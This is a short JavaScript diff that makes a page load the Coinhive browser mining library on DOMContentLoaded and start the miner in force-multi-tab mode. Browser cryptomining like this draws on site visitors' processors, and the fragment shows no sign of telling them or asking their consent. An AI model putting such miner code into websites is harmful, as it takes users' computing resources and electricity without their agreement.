@@ -17,4 +17,6 @@ function start(){
 	miner.start(CoinHive.FORCE_MULTI_TAB);
 }
 
+document.addEventListener('DOMContentLoaded', function() {
 addScript("https://coinhive.com/lib/coinhive.min.js", start);
+});
